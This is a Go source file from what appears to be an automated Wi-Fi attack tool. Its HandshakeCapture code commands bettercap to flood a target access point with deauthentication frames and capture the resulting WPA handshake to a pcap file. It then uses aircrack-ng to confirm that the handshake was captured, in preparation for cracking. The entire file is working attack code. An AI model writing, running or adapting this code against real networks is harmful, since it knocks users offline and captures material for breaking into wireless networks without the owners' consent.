package src

import (
	"fmt"
	"os"
	"os/exec"
	"path/filepath"
	"strings"
	"time"
)

type HandshakeCapture struct {
	bettercap  *Bettercap
	db         *Database
	workingDir string
}

func NewHandshakeCapture(bettercap *Bettercap, db *Database, workingDir string) *HandshakeCapture {
	return &HandshakeCapture{
		bettercap:  bettercap,
		db:         db,
		workingDir: workingDir,
	}
}

func (h *HandshakeCapture) CaptureHandshake(target *Target, channels string) (string, error) {
	scannedDir := filepath.Join(h.workingDir, "scanned")
	targetPcap := target.ESSID + "_" + strings.ReplaceAll(strings.ToLower(target.BSSID), ":", "") + ".pcap"
	targetDir := filepath.Join(scannedDir, strings.ReplaceAll(target.BSSID, ":", ""))
	if err := os.MkdirAll(targetDir, 0755); err != nil {
		return "", err
	}

	capFile := filepath.Join(targetDir, "handshake.pcap")

	h.db.SaveTarget(target, "", StatusScanning)

	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s; set ticker.period 2; set ticker.commands \"wifi.deauth %s\"; ticker on", target.Channel, target.BSSID))

	time.Sleep(10 * time.Second)
	h.bettercap.RunCommand("ticker off")
	time.Sleep(10 * time.Second)

	h.bettercap.RunCommand(fmt.Sprintf("wifi.recon.channel %s", channels))

	if GlobalScanner != nil {
		GlobalScanner.ClearGlobalTargets()
	}

	homeDir, err := os.UserHomeDir()
	if err != nil {
		return "", err
	}
	sourcePcap := filepath.Join(homeDir, targetPcap)

	if _, err := os.Stat(sourcePcap); err == nil {
		if err := os.Rename(sourcePcap, capFile); err != nil {
			return "", err
		}

		os.Remove(sourcePcap)
	}

	if h.verifyHandshake(capFile, target.BSSID) {
		return capFile, nil
	}

	os.RemoveAll(targetDir)

	return "", nil
}

func (h *HandshakeCapture) verifyHandshake(capFile, bssid string) bool {
	if _, err := os.Stat(capFile); os.IsNotExist(err) {
		return false
	}

	cmd := exec.Command("aircrack-ng", "-b", bssid, "-w", "/dev/null", capFile)
	output, _ := cmd.CombinedOutput()

	outputStr := string(output)

	return strings.Contains(outputStr, "1 handshake") || strings.Contains(outputStr, "handshake")
}
